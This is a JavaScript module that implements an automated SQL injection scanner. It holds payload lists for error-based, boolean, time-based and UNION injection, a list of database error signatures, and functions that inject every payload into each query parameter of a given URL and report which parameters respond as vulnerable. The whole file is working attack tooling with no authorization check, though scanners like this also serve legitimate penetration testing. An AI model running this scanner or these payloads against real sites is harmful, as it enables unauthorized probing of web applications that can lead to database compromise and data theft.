const axios = require('axios');

const SQLI_PAYLOADS = {
  'error-based': [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "' OR 1=1--",
    "admin'--",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--"
  ],
  'boolean-based': [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--"
  ],
  'time-based': [
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)#"
  ],
  'union-based': [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--"
  ]
};

const SQL_ERROR_PATTERNS = [
  'SQL syntax',
  'mysql_',
  'PostgreSQL.*ERROR',
  'pg_',
  'Npgsql',
  'SQL Server',
  'OLE DB',
  'mssql_',
  'ODBC SQL Server',
  'SqlException',
  'System.Data.SqlClient',
  'Oracle.*Driver',
  'oci_',
  'ora_',
  'DB2 SQL error',
  'SQLSTATE',
  'SQLite',
  'SQLiteException',
  'Microsoft Access',
  'JET Database',
  'Syntax error in query',
  'Unclosed quotation mark',
  'You have an error in your SQL syntax',
  'SQL command not properly ended'
];

async function testPayload(url, paramName, payload, method) {
  const startTime = Date.now();
  try {
    let testUrl = url;
    let config = {
      method: method,
      timeout: 10000,
      validateStatus: () => true
    };

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, payload);
      testUrl = urlObj.toString();
    } else {
      config.data = { [paramName]: payload };
    }

    const response = await axios(testUrl, config);
    const responseTime = Date.now() - startTime;
    const responseText = String(response.data);

    const hasError = SQL_ERROR_PATTERNS.some(p => {
      try {
        return new RegExp(p, 'i').test(responseText);
      } catch {
        return responseText.toLowerCase().includes(p.toLowerCase());
      }
    });

    const isTimeBased = responseTime > 4000;

    return {
      payload,
      vulnerable: hasError || isTimeBased,
      hasError,
      isTimeBased,
      responseTime,
      statusCode: response.status,
      responseLength: responseText.length
    };
  } catch (error) {
    return {
      payload,
      vulnerable: false,
      hasError: false,
      isTimeBased: false,
      responseTime: Date.now() - startTime,
      error: error.message
    };
  }
}

function extractParams(url) {
  try {
    const urlObj = new URL(url);
    const params = [];
    urlObj.searchParams.forEach((value, key) => {
      params.push({ name: key, value });
    });
    return params;
  } catch {
    return [];
  }
}

async function testSQLInjection(url, attackType = 'error-based', method = 'GET') {
  const params = extractParams(url);
  if (params.length === 0) throw new Error('No parameters found in URL');

  const payloads = SQLI_PAYLOADS[attackType] || SQLI_PAYLOADS['error-based'];
  const results = [];
  const startTime = Date.now();

  for (const param of params) {
    const paramResults = {
      parameter: param.name,
      originalValue: param.value,
      tests: [],
      vulnerable: false,
      successfulPayloads: []
    };

    for (const payload of payloads) {
      const testResult = await testPayload(url, param.name, payload, method);
      paramResults.tests.push(testResult);
      if (testResult.vulnerable) {
        paramResults.vulnerable = true;
        paramResults.successfulPayloads.push({
          payload: testResult.payload,
          type: testResult.isTimeBased ? 'time-based' : 'error-based'
        });
      }
    }
    results.push(paramResults);
  }

  const scanTime = Date.now() - startTime;
  const vulnerableParams = results.filter(r => r.vulnerable);

  return {
    url,
    method,
    attackType,
    totalParams: params.length,
    vulnerableParams: vulnerableParams.length,
    totalTests: results.reduce((sum, r) => sum + r.tests.length, 0),
    scanTime,
    results
  };
}

module.exports = { testSQLInjection, SQLI_PAYLOADS, extractParams };
